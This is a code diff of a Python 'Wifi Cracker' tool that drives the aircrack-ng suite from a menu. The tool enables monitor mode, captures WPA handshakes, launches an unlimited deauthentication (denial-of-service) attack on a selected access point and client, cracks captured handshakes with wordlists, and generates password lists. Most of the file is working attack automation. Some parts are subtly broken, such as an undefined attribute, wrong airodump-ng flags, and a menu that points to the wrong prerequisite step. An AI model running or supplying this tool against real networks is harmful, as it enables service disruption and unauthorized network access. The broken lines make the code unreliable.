@@ -1,3 +1,5 @@
+import glob
+import shutil
 import subprocess
 import os
 import time
@@ -9,28 +11,92 @@ from network_scanner import scan_network
 from colorama import Fore, Style, init as colorama_init
 import getpass
 from animation import Animation
+from Get_AP import find_info_about_ap
 
 colorama_init(autoreset=True)
 
 
 class Attack:
-    def __init__(self, mac='', essid='', iface='wlan0', capture_file='', wordlist='', iface_mon='', channel='', band='', ip_range=None):
-        self.mac = mac
-        self.essid = essid
+    def __init__(self, mac='', essid='', iface='wlan0', capture_file='', wordlist='',
+             iface_mon='', channel='', band='abg', ip_range=None):
+        self.mac = mac 
+        self.essid = essid    
         self.iface = iface
         self.capture_file = capture_file
         self.wordlist = wordlist
-        self.iface_mon = iface_mon
+        self.iface_mon = f"{iface}mon"
         self.channel = channel
+
         self.band = band
         self.ip_range = ip_range
-    
+
+    def _is_iface_up(self, iface=None):
+        iface = iface or self.iface
+        try:
+            result = subprocess.run(
+                ['ip', 'link', 'show', iface],
+                capture_output=True,
+                text=True
+            )
+            return "state UP" in result.stdout
+        except Exception:
+            return False
+        
+    def ensure_iface_up(self, retries=3, wait=2):
+        """
+        Ensures that the network interface is UP.
+        Tries to restart NetworkManager if it is down.
+        """
+
+        iface = self.iface
+
+        print(f"[+] Checking if {iface} is up...")
+
+        for attempt in range(1, retries + 1):
+
+            if self._is_iface_up(iface):
+                print(f"[✓] Interface {iface} is UP.")
+                return True
+
+            print(f"[!] {iface} is DOWN. Attempt {attempt}/{retries}: restarting network services...")
+            try:
+                self.kill_conflicting_processes()
+                self.restart_nm()
+
+            except Exception as e:
+                print(f"[!] Could not restart network manager: {e}")
+
+            time.sleep(wait)
+
+        if not self._is_iface_up(iface):
+            print(f"[✗] {iface} is still DOWN after {retries} attempts.")
+            return False
+
+        print(f"[✓] Interface {iface} is UP.")
+        return True
+
+
+    def update_from_system(self):
+        essid, chan, bssid = find_info_about_ap()
+
+        if essid is None:
+            self.essid = None
+            self.mac = None
+            self.channel = None
+            return None, None, None
+        self.essid = self.get_essid()
+        self.channel = chan
+        self.mac = bssid
+
+        return essid, chan, bssid
+
 
     def list_targets(self, max_retries=20):
-        """Scan network for targets, optionally search by MAC or select one."""
         if not self.ip_range:
-            pass
-            self.ip_range = input(Fore.CYAN + "Enter IP range (e.g., 192.168.1.0/24): ").strip()
+            self.ip_range = input(
+                Fore.CYAN + "Enter IP range (e.g., 192.168.1.0/24): " + Style.RESET_ALL
+            ).strip()
+
             if not self.ip_range:
                 print(Fore.RED + "[!] No IP range entered. Cannot continue.")
                 return None
@@ -39,40 +105,22 @@ class Attack:
         retry_delay = 5
 
         while retries < max_retries:
-            print(Fore.BLUE + f"Scanning network: {self.ip_range} ...")
+            print(Fore.BLUE + f"Scanning network: {self.ip_range} ..." + Style.RESET_ALL)
+
             scan_output = scan_network(self.ip_range)
             mac_data = find_mac_and_state(scan_output)
-
             if not mac_data:
-                print(Fore.RED + f"[!] No hosts detected. Retrying in {retry_delay} seconds...")
+                print(Fore.RED + f"[!] No hosts detected. Retrying in {retry_delay}s...")
                 try:
-                     self.kill_conflicting_processes()
-                     self.restart_nm()
+                    self.kill_conflicting_processes()
+                    self.restart_nm()
                 except Exception as e:
                     print(Fore.RED + f"[!] Failed to restart NetworkManager: {e}")
                     return None
+
                 time.sleep(retry_delay)
                 retries += 1
                 continue
-
-            if self.essid:
-                normalized = self.essid.lower()
-                found = False
-
-                for ip, (mac, state, dev_type) in mac_data.items():
-                    if mac.lower() == normalized:
-                        color_state = colored(state, 'green' if 'up' in state.lower() else 'red')
-                        print(f"{ip:<20}{mac:<20}{color_state:<20}{dev_type}")
-                        found = True
-
-                if not found:
-                    print(Fore.YELLOW + f"[!] MAC {self.essid} not found. Retrying in {retry_delay} seconds...")
-                    time.sleep(retry_delay)
-                    retries += 1
-                    continue
-
-                return mac_data
-
             print(f"{'Index':<6}{'IP Address':<20}{'MAC Address':<20}{'State':<20}{'Device Type'}")
             print("-" * 90)
 
@@ -81,29 +129,46 @@ class Attack:
                 color_state = colored(state, 'green' if 'up' in state.lower() else 'red')
                 print(f"{idx:<6}{ip:<20}{mac:<20}{color_state:<20}{dev_type}")
 
-            # Ask user to select
             while True:
                 try:
-                    choice = input(Fore.CYAN + "\n Select a target (Essid) by index: ").strip()
+                    choice = input(
+                        Fore.CYAN + "\nSelect a target by index: " + Style.RESET_ALL
+                    ).strip()
+
                     if not choice.isdigit():
                         print(Fore.RED + "[!] Enter a valid number.")
                         continue
+
                     choice = int(choice)
+
                     if 0 <= choice < len(indexed_list):
-                        ip, data = indexed_list[choice]
-                        print(Fore.GREEN + f"\n✔ Selected: {ip}  →  {data[0]}")
-                        self.essid = data[0]
-                        self.mac = data[1][0]
-                        return {ip: data}
+                        ip, (mac, state, dev_type) = indexed_list[choice]
+
+                        print(Fore.GREEN + f"\n✔ Selected Device:\n"
+                                        f"   IP   : {ip}\n"
+                                        f"   MAC  : {mac}\n"
+                                        f"   State: {state}\n"
+                                        f"   Type : {dev_type}\n")
+
+                        self.target_ip = ip
+                        self.target_mac = mac
+                        self.target_state = state
+                        self.target_device = dev_type
+
+                        self.essid = mac
+
+                        return {ip: (mac, state, dev_type)}
+
                     else:
                         print(Fore.RED + "[!] Index out of range.")
+
                 except KeyboardInterrupt:
                     print(Fore.RED + "\n[!] Selection cancelled.")
                     return None
 
         print(Fore.RED + "[!] Max retries reached. No targets found.")
         return None
-
+    
     def get_essid(self):
         """Return the currently selected ESSID (after list_targets)."""
         return self.essid
@@ -111,21 +176,90 @@ class Attack:
 
 
     def kill_conflicting_processes(self):
-        print("[*] Killing interfering processes...")
-        subprocess.run(["airmon-ng", "check", "kill"])
-        subprocess.run(["airmon-ng", "stop", self.iface_mon])
+        print(Fore.YELLOW + "[*] Checking and killing interfering processes..." + Style.RESET_ALL)
+        
+        subprocess.run(["sudo", "airmon-ng", "check", "kill"])
+        
+        if hasattr(self, "iface_mon") and self.iface_mon:
+            result = subprocess.run(["iwconfig"], capture_output=True, text=True).stdout
+            if self.iface_mon in result:
+                print(Fore.YELLOW + f"[*] Stopping monitor interface {self.iface_mon}..." + Style.RESET_ALL)
+                subprocess.run(["sudo", "airmon-ng", "stop", self.iface_mon])
+            else:
+                print(Fore.GREEN + f"[*] Monitor interface {self.iface_mon} not found. Nothing to stop." + Style.RESET_ALL)
+        else:
+            print(Fore.GREEN + "[*] No monitor interface set yet. Skipping stop." + Style.RESET_ALL)
+
 
     def find_channel(self):
         self.kill_conflicting_processes()
-        command = f"airmon-ng start {self.iface}; airodump-ng {self.iface_mon} -d {self.mac} --band {self.band}; echo 'Press Enter to exit...'; read"
+        if not hasattr(self, "iface_mon") or not self.iface_mon:
+            self.iface_mon = f"{self.iface}mon"
+        interfaces = subprocess.run(["iwconfig"], capture_output=True, text=True).stdout
+
+        if self.iface_mon in interfaces:
+            print(Fore.GREEN + f"[✓] {self.iface_mon} already in monitor mode." + Style.RESET_ALL)
+        else:
+            print(Fore.YELLOW + f"[+] Enabling monitor mode on {self.iface}..." + Style.RESET_ALL)
+            subprocess.run(["sudo", "airmon-ng", "start", self.iface])
+
+            interfaces = subprocess.run(["iwconfig"], capture_output=True, text=True).stdout
+            if self.iface_mon not in interfaces:
+                print(Fore.RED + f"[!] Failed to enable monitor mode ({self.iface_mon} not found)." + Style.RESET_ALL)
+                return
+            print(Fore.GREEN + f"[✓] Monitor mode active on {self.iface_mon}" + Style.RESET_ALL)
+
+        command = (
+            f"airodump-ng {self.iface_mon} "
+            f"-d {self.mac_} "
+            f"-c {self.channel}; "
+            "echo 'Press Enter to exit...'; read"
+        )
+
+        print(Fore.YELLOW + "[+] Launching airodump-ng to find/stabilize channel..." + Style.RESET_ALL)
         subprocess.run(["gnome-terminal", "--", "bash", "-c", command])
 
     def cap_handshake(self):
-        command = f"airodump-ng {self.iface_mon} -d {self.mac} -c {self.channel} -w {self.capture_file}; echo 'Press Enter to exit...'; read"
+        print(Fore.YELLOW + f"[+] Enabling monitor mode on {self.iface}..." + Style.RESET_ALL)
+        subprocess.run(["sudo", "airmon-ng", "start", self.iface])
+        if not self.iface_mon:
+            self.iface_mon = f"{self.iface}mon"
+
+        result = subprocess.run(["ip", "link"], capture_output=True, text=True)
+
+        if self.iface_mon not in result.stdout:
+            print(Fore.RED + f"[!] Monitor interface {self.iface_mon} not found." + Style.RESET_ALL)
+            print(Fore.RED + "[!] airmon-ng may have failed to create monitor mode." + Style.RESET_ALL)
+            return
+
+        print(Fore.GREEN + f"[✓] Monitor mode active on: {self.iface_mon}" + Style.RESET_ALL)
+        command = (
+            f"airodump-ng {self.iface_mon} "
+            f"-d {self.mac} "
+            f"-c {self.channel} "
+            f"-w {self.capture_file}; "
+            "echo 'Press Enter to exit...'; read"
+        )
+
+        print(Fore.YELLOW + "[+] Launching airodump-ng to capture handshake..." + Style.RESET_ALL)
         subprocess.run(["gnome-terminal", "--", "bash", "-c", command])
 
     def dos(self):
-        self.essid  = self.get_essid()
+        if not self.iface_mon:
+            print(Fore.YELLOW + f"[+] Monitor interface not set. Starting monitor mode on {self.iface}..." + Style.RESET_ALL)
+            subprocess.run(["sudo", "airmon-ng", "start", self.iface])
+            self.iface_mon = f"{self.iface}mon"
+        result = subprocess.run(["ip", "link"], capture_output=True, text=True)
+        if self.iface_mon not in result.stdout:
+            print(Fore.RED + f"[!] Monitor interface {self.iface_mon} not found. Cannot run deauth." + Style.RESET_ALL)
+            return
+
+        self.essid = self.get_essid()
+        if not self.essid:
+            print(Fore.RED + "[!] ESSID not found. Cannot run deauth." + Style.RESET_ALL)
+            return
+        if not self.essid:
+            self.essid = "00:00:00:00:00:00"
         command = f"aireplay-ng --deauth 0 -a {self.mac} {self.iface_mon} -c {self.essid}; echo 'Press Enter to exit...'; read"
         subprocess.run(["gnome-terminal", "--", "bash", "-c", command])
 
@@ -137,17 +271,24 @@ class Attack:
             print("[!] Error: MAC address (-b) is missing.")
             return
 
-        cap_files = [f for f in os.listdir() if f.startswith(self.capture_file) and f.endswith(".cap")]
+        assets_dir = "assets"
+
+        cap_files = [
+            f for f in os.listdir(assets_dir)
+            if f.startswith(self.capture_file) and f.endswith(".cap")
+        ]
+
         if not cap_files:
-            print(f"[!] Error: No .cap capture files found for base '{self.capture_file}'.")
+            print(f"[!] Error: No .cap capture files found for base '{self.capture_file}' in {assets_dir}.")
             return
-        
+
         cap_files.sort()
-        cap_file = cap_files[-1]
+        cap_file = os.path.join(assets_dir, cap_files[-1])
         print(f"[+] Using capture file: {cap_file}")
 
-        command = f"aircrack-ng -w {self.wordlist} -b {self.mac} {cap_file}; echo 'Press Enter to exit...'; read"
+        command = f"aircrack-ng -w {self.wordlist} -b {self.mac} \"{cap_file}\"; echo 'Press Enter to exit...'; read"
         subprocess.run(["gnome-terminal", "--", "bash", "-c", command])
+
 
         
     def generate_pass(self, monster, filepasswords):
@@ -159,121 +300,198 @@ class Attack:
         subprocess.run(['systemctl', 'restart', 'NetworkManager'])
         
 
-    def find_info_about_ap(self):
-        command_str = 'nmcli -f SSID,CHAN,BSSID dev wifi'
-        subprocess.run(command_str,shell=True)
+    
     def channeloriented(self):
-        self.channel = input('choose the channel that you see:')
-        command_str = f'airodump-ng {self.iface_mon} -d {self.mac} -c {self.channel}'
-        subprocess.run(["gnome-terminal", "--", "bash", "-c", command_str])
+        if not self.iface_mon:
+            self.iface_mon = f"{self.iface}mon"
+            print(Fore.YELLOW + f"[*] Monitor interface not set. Assuming {self.iface_mon}" + Style.RESET_ALL)
+        if not self.mac:
+            print(Fore.RED + "[!] MAC/BSSID not set. Cannot run airodump-ng." + Style.RESET_ALL)
+            return
+        if not self.channel:
+            print(Fore.RED + "[!] Channel not set. Cannot run airodump-ng." + Style.RESET_ALL)
+            return
+        command_str = f'airodump-ng {self.iface_mon} -d {self.mac} -b {self.channel} -band {self.band}'
+        print(Fore.YELLOW + f"[*] Launching airodump-ng on {self.iface_mon}, BSSID {self.mac}, channel {self.channel}..." + Style.RESET_ALL)
+        subprocess.run(["gnome-terminal", "--", "bash", "-c", f"{command_str}; echo 'Press Enter to exit...'; read"])
+
     def wireshark_EAPOL(self):
-        cap_files = [f for f in os.listdir() if f.startswith(self.capture_file) and f.endswith(".cap")]
+        assets_path = os.path.join(os.getcwd(), "assets")
+        cap_files = [
+            f for f in os.listdir(assets_path)
+            if f.startswith(self.capture_file) and f.endswith(".cap")
+        ]
+
         if not cap_files:
-            print(Fore.RED + f"[!] No .cap files found for base '{self.capture_file}'. Cannot open Wireshark.")
+            print(Fore.RED + f"[!] No .cap files found for base '{self.capture_file}' in assets/. Cannot open Wireshark.")
+            return
+        cap_files.sort()
+        cap_file = cap_files[-1]
+        cap_full_path = os.path.join(assets_path, cap_file)
+        print(Fore.GREEN + f"[+] Opening Wireshark for: {cap_full_path}")
+        command_str = f'wireshark "{cap_full_path}" -Y "eapol"; echo "Press Enter to exit..."; read'
+        subprocess.run(["gnome-terminal", "--", "bash", "-c", command_str])
+
+  
+    def call(self):
+        if self.mac is None:
+            print(Fore.RED + "Failed to retrieve AP information." + Style.RESET_ALL)
             return
 
-        cap_files.sort()
-        cap_file = cap_files[-1] 
-        print(Fore.GREEN + f"[+] Opening Wireshark for: {cap_file}")
+        print(Fore.GREEN + f"[✓] AP Selected:" + Style.RESET_ALL)
+        print(f"   SSID   : {self.essid}")
+        print(f"   BSSID  : {self.mac}")
+        print(f"   Channel: {self.channel}")
 
-        command_str = f'wireshark "{cap_file}" -Y "eapol"; echo "Press Enter to exit..."; read'
-        subprocess.run(["gnome-terminal", "--", "bash", "-c", command_str])
-        
-
+  
     @staticmethod
     def menu():
-        print(Fore.MAGENTA + Style.BRIGHT + "\n=== Welcome to the Attack Menu ===" + Style.RESET_ALL)
-        print(Fore.CYAN + " 00 " + Fore.WHITE + "- " + Fore.YELLOW + "Find info about AP (run this first)")
-        print(Fore.CYAN + "  1 " + Fore.WHITE + "- " + Fore.YELLOW + "Find Channel (run this second)")
-        print(Fore.CYAN + "  2 " + Fore.WHITE + "- " + Fore.YELLOW + "Capture Handshake")
-        print(Fore.CYAN + "  3 " + Fore.WHITE + "- " + Fore.YELLOW + "Denial of Service (DoS)")
-        print(Fore.CYAN + "  4 " + Fore.WHITE + "- " + Fore.YELLOW + "Crack Handshake")
-        print(Fore.CYAN + "  5 " + Fore.WHITE + "- " + Fore.YELLOW + "Generate Password List")
-        print(Fore.CYAN + "  6 " + Fore.WHITE + "- " + Fore.YELLOW + "Restart Network Manager (ensure this is up before executing 00)")
-        print(Fore.CYAN + "001 " + Fore.WHITE + "- " + Fore.YELLOW + "See EAPOL in Wireshark")
-        print(Fore.CYAN + "  0 " + Fore.WHITE + "- " + Fore.RED + Style.BRIGHT + "Exit" + Style.RESET_ALL)
+        header = (
+            Fore.MAGENTA + Style.BRIGHT +
+            "\n========================================\n"
+            "            Attack Menu \n"
+            "========================================" +
+            Style.RESET_ALL
+        )
+
+        print(header)
+
+        print(Fore.CYAN + "   1 " + Fore.WHITE + "│ " + Fore.YELLOW + "Find Info About AP  (run this first)")
+        print(Fore.CYAN + "   2 " + Fore.WHITE + "│ " + Fore.YELLOW + "Capture Handshake  (second)")
+        print(Fore.CYAN + "   3 " + Fore.WHITE + "│ " + Fore.YELLOW + "Denial of Service (DoS)")
+        print(Fore.CYAN + "   4 " + Fore.WHITE + "│ " + Fore.YELLOW + "Crack Handshake")
+        print(Fore.CYAN + "   5 " + Fore.WHITE + "│ " + Fore.YELLOW + "Generate Password List (optional)")
+        print(Fore.CYAN + "   6 " + Fore.WHITE + "│ " + Fore.YELLOW + "Open EAPOL in Wireshark")
+        print(Fore.CYAN + "   x "+ Fore.WHITE + "│ " + Fore.YELLOW + "Restart Network Manager")
         
-        choice = input(Fore.GREEN + Style.BRIGHT + "\n Enter your choice: " + Style.RESET_ALL).strip()
+
+        print(
+            Fore.CYAN + "   0 " + Fore.WHITE + "│ "
+            + Fore.RED + Style.BRIGHT + "Exit"
+            + Style.RESET_ALL
+        )
+
+        choice = input(
+            Fore.GREEN + Style.BRIGHT + "\n ➤ Enter your choice: " + Style.RESET_ALL
+        ).strip()
+
         return choice
+
+
 
 
 def main():
     try:
-        iface = input(Fore.CYAN + "Enter your interface (e.g. wlan0): " + Style.RESET_ALL).strip()
+        iface = input(
+            Fore.CYAN + "Enter your interface (e.g. wlan0): " + Style.RESET_ALL
+        ).strip()
+
         if not iface:
             iface = "wlan0"
-            print(Fore.YELLOW + f"  No interface entered. Using default: {iface}")
-        iface_mon = iface + 'mon'
+            print(Fore.YELLOW + f"No interface entered. Using default: {iface}")
 
-        capture_file = input(Fore.CYAN + "Enter capture filename base (e.g hack0): " + Style.RESET_ALL).strip()
+        iface_mon = f"{iface}mon"
+
+        capture_file = input(
+            Fore.CYAN + "Enter capture filename base (e.g. session1): " + Style.RESET_ALL
+        ).strip()
+
         if not capture_file:
-            capture_file = "hack0"
-            print(Fore.YELLOW + f"  No filename entered. Using default: {capture_file}")
+            capture_file = "session1"
+            print(Fore.YELLOW + f"No filename entered. Using default: {capture_file}")
 
-        attack = Attack(mac="",essid='', iface=iface, capture_file=capture_file, wordlist="", iface_mon=iface_mon, channel="", band="",ip_range=None)
-       
+        attack = Attack(
+            mac="",
+            essid="",
+            iface=iface,
+            capture_file=capture_file,
+            wordlist="",
+            iface_mon=iface_mon,
+            channel="",
+            band="abg",
+            ip_range=None
+        )
+
+        while not attack.ensure_iface_up():
+            print("[!] Interface still down. Retrying...")
+            time.sleep(2)
+        try:
+            _, chan, mac = attack.update_from_system()
+            essid = attack.get_essid()
+
+            if mac:
+                attack.mac = mac
+            if essid:
+                attack.essid = essid
+            if chan:
+                attack.channel = chan
+
+        except Exception as e:
+            print(Fore.RED + f"[!] Could not read system info: {e}")
+
+        print(Fore.CYAN + "Scanning for nearby network hosts..." + Style.RESET_ALL)
+
         while True:
             hosts = attack.list_targets()
+
             if hosts:
                 print(Fore.GREEN + f"[+] Hosts found: {len(hosts)}")
                 break
-            else:
-                print(Fore.RED + "No hosts found. Please try again.")
 
-        mac = attack.get_essid()
-        if not mac:
-            mac = "00:00:00:00:00:00"
-            print(Fore.YELLOW + f"  No MAC entered. Using placeholder: {mac}")
+            print(Fore.RED + "No hosts found. Retrying...")
+            time.sleep(2)
 
-        choice = input(Fore.BLUE + "Do you have a wordlist? Type 'yes' or press Enter to auto-generate: " + Style.RESET_ALL).strip().lower()
+        if not attack.mac:
+            print(Fore.RED + "[!] No MAC found or entered. Cannot continue.")
+            return
+
+        choice = input(
+            Fore.BLUE + "Do you have a wordlist? Type 'yes' or press Enter to create one: "
+            + Style.RESET_ALL
+        ).strip().lower()
+
+        wordlist = None
+
         if choice == "yes":
-            wordlist = input(Fore.CYAN + "Enter path to wordlist: " + Style.RESET_ALL).strip()
-            if not wordlist or not os.path.exists(wordlist):
-                print(Fore.RED + f"File '{wordlist}' not found. Generating a default wordlist.")
+            wl = input(Fore.CYAN + "Enter path to wordlist: " + Style.RESET_ALL).strip()
+
+            if wl and os.path.exists(wl):
+                wordlist = wl
+            else:
+                print(Fore.RED + "Wordlist not found. Switching to auto-generate mode.")
                 choice = ""
+
         if choice != "yes":
-            print(Fore.YELLOW + "  No wordlist provided. Generating one using your input...")
-            base_word = getpass.getpass(Fore.CYAN + "Enter part of the password to add random specials: " + Style.RESET_ALL).strip()
+            print(Fore.YELLOW + "  Auto-generating wordlist...")
+            base_word = getpass.getpass(Fore.CYAN + "Enter part of password: " + Style.RESET_ALL).strip()
             if not base_word:
                 base_word = "password"
-                print(Fore.YELLOW + f"  No input provided. Using default base word: {base_word}")
-            wordlist = "generated_password.txt"
+                print(Fore.YELLOW + "  No input. Using default: password")
+            assets_path = os.path.join(os.getcwd(), "assets")
+            wordlist = os.path.join(assets_path, "generated_password.txt")
             generate_password(base_word, wordlist)
-            print(Fore.GREEN + f"Password list generated: {wordlist}")
+            print(Fore.GREEN + f"[+] Wordlist saved to: {wordlist}")
 
-        attack.mac = mac
         attack.wordlist = wordlist
-
-        channel = ''
-        band = ''
-
         while True:
             choice = Attack.menu()
+            if choice == "1":
+                print(Fore.YELLOW + "Step 1: Using existing network info" + Style.RESET_ALL)
+                attack.call()
 
-            if choice == "00":
-                print(Fore.BLUE + "Scanning for access points...")
-                attack.find_info_about_ap()
-                attack.mac = input(Fore.CYAN + "Enter AP MAC address from step 00 or the router's BSSID: " + Style.RESET_ALL).strip()
-                if not attack.mac:
-                    print(Fore.YELLOW + "  No MAC entered. Skipping update.")
-
-            elif choice == "1":
-                band = input(Fore.CYAN + "Enter band (like 'a', 'ab', 'abg') or press Enter for default ('abg'): " + Style.RESET_ALL).strip()
-                if not band:
-                    band = 'abg'
-                    print(Fore.YELLOW + f"  No band entered. Using default: {band}")
-                attack.band = band
-                print(Fore.YELLOW + "Press CTRL + C to stop channel scanning.")
-                attack.find_channel()
-                input(Fore.CYAN + "Press Enter to proceed..." + Style.RESET_ALL)
-                attack.channeloriented()
+                if not attack.channel:
+                    print(Fore.YELLOW + "[!] No channel detected. Using default band: abg" + Style.RESET_ALL)
+                    attack.band = "abg"
+                    attack.channeloriented()
+                else:
+                    print(Fore.GREEN + "[✓] Channel and BSSID OK" + Style.RESET_ALL)
 
             elif choice == "2":
-                channel = input(Fore.CYAN + "Enter the channel number: " + Style.RESET_ALL).strip()
-                if not channel:
-                    print(Fore.YELLOW + "  No channel entered. Skipping handshake capture.")
+                if not attack.channel:
+                    print(Fore.RED + "[!] No channel known. Use option 2 first." + Style.RESET_ALL)
                     continue
-                attack.channel = channel
+
+                print(Fore.GREEN + f"[+] Using channel {attack.channel} for handshake capture" + Style.RESET_ALL)
                 attack.cap_handshake()
 
             elif choice == "3":
@@ -282,51 +500,60 @@ def main():
                 attack.dos()
 
             elif choice == "4":
-                cap_file_path = os.path.join("assets", f"{attack.capture_file}-01.cap")
+                for pattern in ("*.csv", "*.netxml", "*.cap"):
+                    for file in glob.glob(pattern):
+                        dst = os.path.join("assets", os.path.basename(file))
+                        if not os.path.exists(dst):
+                         shutil.move(file, "assets")
+                result_file = f"{attack.capture_file}-01.cap"
+                cap_file_path = os.path.join("assets", result_file)
+
                 if os.path.exists(cap_file_path):
-                    print(Fore.GREEN + f"Capture file found: {cap_file_path}")
+                    print(Fore.GREEN + f"[+] Capture file found: {cap_file_path}")
                     attack.crack()
                 else:
-                    print(Fore.RED + f"Capture file '{cap_file_path}' not found. Cannot crack yet.")
+                    print(Fore.RED + f"[!] Capture file not found: {cap_file_path}")
 
             elif choice == "5":
-                monster = input(Fore.CYAN + "Enter pattern for password generation (e.g., abc%%%%%%): " + Style.RESET_ALL).strip()
+                monster = input(Fore.CYAN + "Enter pattern (e.g. abc%%%%%%): " + Style.RESET_ALL).strip()
                 if not monster:
                     monster = "abc%%%%%%"
-                    print(Fore.YELLOW + f"  No pattern entered. Using default: {monster}")
-                filepasswords = input(Fore.CYAN + "Enter output filename (saved in assets/): " + Style.RESET_ALL).strip()
-                if not filepasswords:
-                    filepasswords = "generated_passwords.txt"
-                    print(Fore.YELLOW + f"No filename entered. Using default: {filepasswords}")
-                BASE_DIR = os.path.dirname(os.path.abspath(__file__))
-                ASSETS_DIR = os.path.join(BASE_DIR, "assets")
-                os.makedirs(ASSETS_DIR, exist_ok=True)
+                    print(Fore.YELLOW + "Using default pattern: abc%%%%%%")
 
-                filepasswords_path = os.path.join(ASSETS_DIR, filepasswords)
-                attack.generate_pass(monster, filepasswords_path)
+                fname = input(Fore.CYAN + "Enter output filename (assets/): " + Style.RESET_ALL).strip()
+                if not fname:
+                    fname = "generated_passwords.txt"
 
-                print(Fore.GREEN + f"Passwords generated and saved to {filepasswords_path}")
+                base = os.path.dirname(os.path.abspath(__file__))
+                assets = os.path.join(base, "assets")
+                os.makedirs(assets, exist_ok=True)
 
-            elif choice == "001":
-                print(Fore.BLUE + "Opening Wireshark to inspect EAPOL packets...")
-                attack.wireshark_EAPOL()
+                out = os.path.join(assets, fname)
+                attack.generate_pass(monster, out)
+
+                print(Fore.GREEN + f"[+] Passwords saved to {out}")
 
             elif choice == "6":
-                print(Fore.CYAN + "Restarting Network Manager...")
+                print(Fore.BLUE + "Opening Wireshark to inspect EAPOL…" + Style.RESET_ALL)
+                attack.wireshark_EAPOL()
+
+            elif choice == "x":
+                print(Fore.CYAN + "Restarting Network Manager…" + Style.RESET_ALL)
+                attack.kill_conflicting_processes()
                 attack.restart_nm()
-                print(Fore.GREEN + "Network Manager restarted successfully.")
+                print(Fore.GREEN + "[✓] Network Manager restarted" + Style.RESET_ALL)
 
             elif choice == "0":
-                print(Fore.MAGENTA + "Exiting... Stay ethical!")
+                print(Fore.MAGENTA + "Exiting… Stay ethical!" + Style.RESET_ALL)
                 break
 
             else:
-                print(Fore.RED + "Invalid choice, please try again.")
+                print(Fore.RED + "Invalid choice." + Style.RESET_ALL)
 
     except KeyboardInterrupt:
-        print(Fore.MAGENTA + "\nExiting gracefully (CTRL+C pressed). Stay ethical!")
+        print(Fore.MAGENTA + "\nExiting gracefully (CTRL+C pressed)." + Style.RESET_ALL)
         sys.exit(0)
-
+        
 if __name__ == "__main__":
     Animation.animated_banner("Wifi Cracker","By cyb2rS2c", frames=8, delay=0.07)
     main()
